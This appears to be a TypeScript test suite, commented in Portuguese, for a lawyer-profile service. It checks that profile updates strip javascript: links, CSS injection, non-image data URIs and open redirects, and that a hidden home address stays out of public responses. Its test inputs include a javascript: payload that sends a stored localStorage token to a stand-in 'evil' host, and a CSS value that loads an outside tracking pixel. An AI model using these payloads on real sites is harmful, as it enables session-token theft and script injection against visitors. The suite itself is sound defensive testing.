// O que o PUT /profiles/me aceita gravar. O corpo é JSON livre e o resultado é
// lido por visitantes — então estes testes tratam a entrada como hostil: link que
// executa script, texto de um milhão de caracteres, lista infinita, tipo trocado.
//
// Prisma é dublê (o banco de produção é Postgres e não existe aqui): o que se
// verifica é o que o serviço MANDOU gravar.

import { describe, expect, it, vi } from 'vitest'
import { avatarPublico, ProfilesService } from './profiles.service'
import { TERMS_VERSION } from '../legal/termos'

type Qualquer = Record<string, any>

function service(plan: 'free' | 'pro' | 'premium' = 'premium') {
  const gravado: Qualquer[] = []
  const prisma: Qualquer = {
    profile: {
      findUnique: vi.fn().mockResolvedValue({
        id: 'p1',
        moderationStatus: 'active',
        plan,
        oabNumber: '123',
        userId: 'u1',
        // Conta com o aceite dos Termos em dia: sem isto, o serviço recusa
        // qualquer publicação — e o que estes testes conferem é o SANEAMENTO da
        // entrada, não o aceite (que tem testes próprios em publicar.spec.ts).
        user: { termsVersion: TERMS_VERSION },
      }),
      update: vi.fn((a: Qualquer) => {
        gravado.push(a.data)
        return Promise.resolve({ ...a.data, plan, areas: [], faqs: [], socials: [] })
      }),
    },
    auditLog: { create: vi.fn().mockResolvedValue({}) },
  }
  return { svc: new ProfilesService(prisma as any), gravado, prisma }
}

const base = { name: 'Marina Sales', oabNumber: 'OAB/SP 123', published: false }

describe('links do perfil', () => {
  it('descarta href que executa script (javascript:) em redes e agenda', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      contact: { scheduling: 'javascript:fetch("//evil/"+localStorage.token)' },
      socials: [
        { kind: 'website', url: 'javascript:alert(1)' },
        { kind: 'instagram', url: 'https://instagram.com/marina' },
      ],
    })
    const d = gravado[0]
    expect(d.scheduling).toBeNull()
    // `order: 0` e não 1: a numeração é atribuída DEPOIS de descartar os links
    // recusados. Contar antes deixaria um buraco na ordem — a primeira rede
    // sobrevivente começaria em 1, e o `orderBy` do banco ainda funcionaria, mas
    // a numeração deixaria de corresponder à lista que o editor mostra.
    expect(d.socials.create).toEqual([
      { kind: 'instagram', url: 'https://instagram.com/marina', order: 0 },
    ])
  })

  it('recusa rede desconhecida virando "website" — o público não tem ícone para ela', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, socials: [{ kind: 'orkut', url: 'https://orkut.com/x' }] })
    expect(gravado[0].socials.create[0].kind).toBe('website')
  })

  it('limita a quantidade de redes', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: Array.from({ length: 200 }, () => ({ kind: 'website', url: 'https://a.com' })),
    })
    expect(gravado[0].socials.create.length).toBeLessThanOrEqual(8)
  })
})

describe('foto de perfil', () => {
  it('aceita a imagem embutida que o navegador gerou', async () => {
    const { svc, gravado } = service()
    const uri = 'data:image/jpeg;base64,/9j/4AAQSkZJRg=='
    await svc.update('u1', { ...base, avatarUrl: uri })
    expect(gravado[0].avatarUrl).toBe(uri)
  })

  it('recusa data URI que não é imagem e arquivo grande demais', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, avatarUrl: 'data:text/html;base64,PHNjcmlwdD4=' })
    expect(gravado[0].avatarUrl).toBeNull()

    const { svc: svc2, gravado: g2 } = service()
    await svc2.update('u1', { ...base, avatarUrl: `data:image/png;base64,${'A'.repeat(500_000)}` })
    expect(g2[0].avatarUrl).toBeNull()
  })
})

describe('tamanho e tipo', () => {
  it('corta campo gigante em vez de gravar um milhão de caracteres', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, city: 'x'.repeat(1_000_000), name: 'y'.repeat(100_000) })
    expect(gravado[0].city.length).toBeLessThanOrEqual(80)
    expect(gravado[0].name.length).toBeLessThanOrEqual(70)
  })

  // Sem publicar: aqui o que se prova é que tipo errado vira valor saneado, e não
  // erro de runtime. O caso COM `published` mudou de lugar (logo abaixo), porque
  // publicar passou a exigir nome e OAB — e um rascunho com `name: 12345` fica
  // exatamente sem nome depois do saneamento.
  it('tipo trocado não derruba a rota', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      name: 12345,
      oabNumber: { a: 1 },
      city: [],
      socials: 'não é lista',
      contact: 'nem isso',
      branding: 7,
      published: 0,
    })
    const d = gravado[0]
    expect(d.name).toBe('')
    expect(d.socials.create).toEqual([])
    expect(typeof d.published).toBe('boolean')
    expect(d.published).toBe(false)
  })

  it('published aceita qualquer coisa e grava booleano', async () => {
    const { svc, gravado } = service()
    // `truthDeclared` porque isto é uma ESTREIA (o dublê devolve published:false
    // como estado atual) — ver publicar.spec.ts para as regras da declaração.
    await svc.update('u1', { ...base, published: 'sim', truthDeclared: true })
    expect(gravado[0].published).toBe(true) // "sim" é verdadeiro
    expect(typeof gravado[0].published).toBe('boolean')
  })

  it('cor da marca só entra em hexadecimal (senão seria CSS injetado)', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      branding: { accent: 'red; background:url(http://evil/pixel)', customDomain: 'javascript:1' },
    })
    expect(gravado[0].brandAccent).toBeNull()
    expect(gravado[0].customDomain).toBeNull()
  })
})

// O balão de conversa no canto do perfil (assistant.floating).
//
// É um elemento que segue o visitante pela página — o oposto da sobriedade que
// o Prov. 205/2021 pede — e por isso nasce desligado e é perk de plano pago.
// Duas travas, e as duas são do SERVIDOR: o front pode se enganar, o corpo da
// requisição pode vir de qualquer lugar.
describe('balão de conversa', () => {
  it('só `true` liga — corpo malformado não liga um elemento que persegue', async () => {
    for (const lixo of ['true', 1, 'sim', {}, [], null]) {
      const { svc, gravado } = service()
      await svc.update('u1', { ...base, assistant: { floating: lixo } })
      expect(gravado[0].assistantFloating, `"${JSON.stringify(lixo)}" ligou o balão`).toBe(false)
    }
  })

  it('grava ligado quando o advogado ligou de verdade', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, assistant: { floating: true } })
    expect(gravado[0].assistantFloating).toBe(true)
  })

  it('ausente é desligado — o padrão nunca é aparecer', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { ...base, assistant: {} })
    expect(gravado[0].assistantFloating).toBe(false)
  })
})

describe('plano', () => {
  it('o plano do corpo é ignorado — quem manda é a assinatura do banco', async () => {
    const { svc, gravado } = service('free')
    await svc.update('u1', { ...base, plan: 'premium', theme: 'obsidian' })
    // tema exclusivo do Max não sobrevive a um perfil Free
    expect(gravado[0].theme).not.toBe('obsidian')
    expect(gravado[0].plan).toBeUndefined()
  })

  it('recusa plano inválido na porta da assinatura', async () => {
    const { svc } = service()
    await expect(svc.setPlan('u1', 'deus')).rejects.toThrow(/inválido/i)
    await expect(svc.setPlan('u1', { plan: 'premium' })).rejects.toThrow(/inválido/i)
  })
})

// Publicar exige nome e número de OAB.
//
// Antes não exigia nada: o perfil ia ao ar com o cabeçalho vazio, o endereço
// `perfil-4821` e o link do CNA sem nome para consultar — e a requisição
// respondia 200, então ninguém era avisado. O advogado descobria abrindo o
// próprio link, se descobrisse.
describe('campos obrigatórios para publicar', () => {
  const semNome = { name: '   ', oabNumber: 'OAB/SP 123', published: true }
  const semOab = { name: 'Marina Sales', oabNumber: '', published: true }
  const semNada = { name: '', oabNumber: '', published: true }

  it('recusa e DIZ o que falta', async () => {
    const { svc } = service()
    await expect(svc.update('u1', semNome)).rejects.toThrow(/falta preencher: seu nome\./)
    await expect(svc.update('u1', semOab)).rejects.toThrow(/falta preencher: seu número da OAB\./)
  })

  it('lista tudo que falta de uma vez, não um por vez', async () => {
    const { svc } = service()
    // Recusar um campo por vez faria a pessoa descobrir o segundo problema só
    // depois de resolver o primeiro — duas viagens para o mesmo destino.
    await expect(svc.update('u1', semNada)).rejects.toThrow(
      /seu nome e seu número da OAB/,
    )
  })

  it('avisa que o rascunho não se perdeu', async () => {
    const { svc } = service()
    // Quem vê "não foi possível publicar" assume que perdeu o que escreveu.
    await expect(svc.update('u1', semNada)).rejects.toThrow(/rascunho continua salvo/)
  })

  it('não impede SALVAR rascunho incompleto — só publicar', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', { name: '', oabNumber: '', published: false })
    expect(gravado[0].published).toBe(false)
  })

  it('deixa publicar quando os dois estão preenchidos', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      name: 'Marina Sales',
      oabNumber: 'OAB/SP 123',
      published: true,
      truthDeclared: true,
    })
    expect(gravado[0].published).toBe(true)
  })
})

// A ordem das redes é escolha do advogado (ele arrasta no editor). Antes não
// existia coluna `order` nem `orderBy` — `areas` e `faqs` sempre tiveram, e só as
// redes tinham ficado de fora. O sintoma era discreto e constante: a fileira de
// ícones do perfil trocava de posição sozinha entre uma visita e outra.
describe('ordem das redes', () => {
  it('grava a ordem da lista recebida', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: [
        { kind: 'linkedin', url: 'https://linkedin.com/in/marina' },
        { kind: 'instagram', url: 'https://instagram.com/marina' },
        { kind: 'website', url: 'https://marina.adv.br' },
      ],
    })
    expect(gravado[0].socials.create.map((s: Qualquer) => [s.kind, s.order])).toEqual([
      ['linkedin', 0],
      ['instagram', 1],
      ['website', 2],
    ])
  })

  it('link recusado no meio não deixa buraco na numeração', async () => {
    const { svc, gravado } = service()
    await svc.update('u1', {
      ...base,
      socials: [
        { kind: 'linkedin', url: 'https://linkedin.com/in/marina' },
        { kind: 'instagram', url: 'javascript:alert(1)' }, // recusado
        { kind: 'website', url: 'https://marina.adv.br' },
      ],
    })
    expect(gravado[0].socials.create.map((s: Qualquer) => [s.kind, s.order])).toEqual([
      ['linkedin', 0],
      ['website', 1],
    ])
  })
})

// ---------------------------------------------------------------------------
// A rota da foto e a busca pública — auditoria de 01/09/2026.
//
// As duas devolvem coisa ao mundo inteiro, sem sessão. Estes testes travam o que
// elas NÃO podem voltar a fazer.
// ---------------------------------------------------------------------------

function servicoDeLeitura(avatarUrl: string | null, extras: Qualquer = {}) {
  const prisma: Qualquer = {
    profile: {
      findFirst: vi.fn().mockResolvedValue(avatarUrl === null && !extras.linhas ? null : { avatarUrl, ...extras }),
      findMany: vi.fn().mockResolvedValue(extras.linhas ?? []),
    },
  }
  return { svc: new ProfilesService(prisma as any), prisma }
}

describe('GET /profiles/:slug/avatar', () => {
  it('devolve os bytes quando a foto é a imagem embutida que guardamos', async () => {
    // 1x1 PNG transparente.
    const b64 =
      'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg=='
    const { svc } = servicoDeLeitura(`data:image/png;base64,${b64}`)
    const foto = await svc.avatarBySlug('marina')
    expect(foto.contentType).toBe('image/png')
    // Os bytes de um PNG começam sempre com esta assinatura.
    expect(foto.bytes.subarray(0, 4)).toEqual(Buffer.from([0x89, 0x50, 0x4e, 0x47]))
  })

  it('NÃO redireciona para a foto hospedada fora — seria redirecionamento aberto', async () => {
    // O cenário do atacante: conta grátis, foto apontada para onde ele quiser, e
    // um link do NOSSO domínio levando à página dele. Criar a conta é o único
    // custo, e ele é zero.
    const { svc } = servicoDeLeitura('https://site-do-golpe.example/pagina')
    await expect(svc.avatarBySlug('marina')).rejects.toThrow(/Sem foto/)
  })

  it('recusa esquema que não é https nem data (o que já estiver gravado, também)', async () => {
    const { svc } = servicoDeLeitura('javascript:alert(1)')
    await expect(svc.avatarBySlug('marina')).rejects.toThrow(/Sem foto/)
  })
})

// GET /directory foi REMOVIDA (auditoria de 03/09/2026) — rota pública sem tela
// que só acumulava achado (megabytes de foto, colisão de OR, vazamento de campo
// censurado, 40 hashes por requisição). Os testes dela saíram junto; a ausência
// da rota é cobrada por rotas.spec.ts, e o comportamento da foto pública — que
// era o que valia a pena guardar daqui — está travado logo abaixo.

describe('avatarPublico — a foto pública é ENDEREÇO, nunca os bytes', () => {
  it('data URI vira a rota versionada (o ?v= é o hash: muda com a foto, e só)', () => {
    const gordo = `data:image/png;base64,${'A'.repeat(5000)}`
    const url = avatarPublico('marina', gordo)
    expect(url).toMatch(/^\/api\/profiles\/marina\/avatar\?v=[0-9a-f]{8}$/)
    // Determinístico: o mesmo conteúdo dá a mesma versão (é o que o ETag usa).
    expect(avatarPublico('marina', gordo)).toBe(url)
    // E a versão acompanha o CONTEÚDO, não o slug.
    expect(avatarPublico('marina', `data:image/png;base64,${'B'.repeat(5000)}`)).not.toBe(url)
  })

  it('foto hospedada fora sai como está — ela já é um endereço público', () => {
    expect(avatarPublico('marina', 'https://cdn.exemplo/foto.jpg')).toBe(
      'https://cdn.exemplo/foto.jpg',
    )
  })

  it('sem foto, ou com esquema que não é https nem data, sai NADA', () => {
    expect(avatarPublico('marina', null)).toBeUndefined()
    expect(avatarPublico('marina', undefined)).toBeUndefined()
    expect(avatarPublico('marina', 'javascript:alert(1)')).toBeUndefined()
    expect(avatarPublico('marina', 'http://sem-tls/x.jpg')).toBeUndefined()
  })

  it('slug estranho é codificado — nunca quebra o caminho da URL', () => {
    expect(avatarPublico('a/b?c', 'data:image/png;base64,AAAA')).toMatch(
      /^\/api\/profiles\/a%2Fb%3Fc\/avatar\?v=/,
    )
  })
})

describe('GET /profiles/:slug — endereço escondido', () => {
  // O interruptor do editor promete, com estas palavras: "O endereço fica só com
  // você — não aparece na página nem no cartão de contato que o visitante
  // salva". E a dica diz para quem ele foi feito: "Quem atende em casa costuma
  // deixar desligado". O dado em jogo é endereço residencial.
  //
  // Quem cumpria a promessa era o React. A API mandava tudo, e um `curl` no
  // perfil público devolvia rua, número, complemento, bairro e CEP.
  const linhaCom = (addressPublic: boolean) => ({
    id: 'p1',
    slug: 'marina-sales',
    name: 'Marina Sales',
    oabNumber: 'OAB/SP 1',
    plan: 'premium',
    planStatus: 'active',
    published: true,
    moderationStatus: 'active',
    hiddenSections: '[]',
    city: 'São Paulo',
    state: 'SP',
    addressZip: '01310100',
    addressStreet: 'Rua de Casa',
    addressNumber: '404',
    addressComplement: 'Apto 72',
    addressDistrict: 'Bela Vista',
    addressPublic,
    areas: [],
    faqs: [],
    socials: [],
  })

  function servicoDePerfil(linha: Qualquer) {
    const prisma: Qualquer = {
      profile: { findFirst: vi.fn().mockResolvedValue(linha), findUnique: vi.fn().mockResolvedValue(linha) },
      linkEvent: { create: vi.fn(() => ({ catch: () => undefined })) },
    }
    return new ProfilesService(prisma as any)
  }

  it('não manda rua, número, complemento, bairro nem CEP ao visitante', async () => {
    const svc = servicoDePerfil(linhaCom(false))
    const publico = await svc.getBySlug('marina-sales')
    expect(publico.address).toBeUndefined()
    // A prova que interessa é sobre a resposta INTEIRA: não basta o campo
    // `address` sumir se o endereço reaparecer em outro lugar do JSON.
    const json = JSON.stringify(publico)
    for (const pedaco of ['Rua de Casa', '404', 'Apto 72', 'Bela Vista', '01310100']) {
      expect(json, `"${pedaco}" vazou na resposta pública`).not.toContain(pedaco)
    }
  })

  it('cidade e estado continuam — foro geográfico é público por desenho', async () => {
    const svc = servicoDePerfil(linhaCom(false))
    const publico = await svc.getBySlug('marina-sales')
    expect(publico.city).toBe('São Paulo')
    expect(publico.state).toBe('SP')
  })

  it('com o interruptor ligado, o endereço vai inteiro (é o que o dono pediu)', async () => {
    const svc = servicoDePerfil(linhaCom(true))
    const publico = await svc.getBySlug('marina-sales')
    expect(publico.address).toMatchObject({
      rua: 'Rua de Casa',
      numero: '404',
      complemento: 'Apto 72',
      bairro: 'Bela Vista',
      cep: '01310100',
      publico: true,
    })
  })

  it('o DONO continua vendo o que escondeu — senão o campo se apaga na tela dele', async () => {
    const svc = servicoDePerfil(linhaCom(false))
    const meu = await svc.getMine('u1')
    expect(meu!.address).toMatchObject({ rua: 'Rua de Casa', numero: '404', publico: false })
  })
})
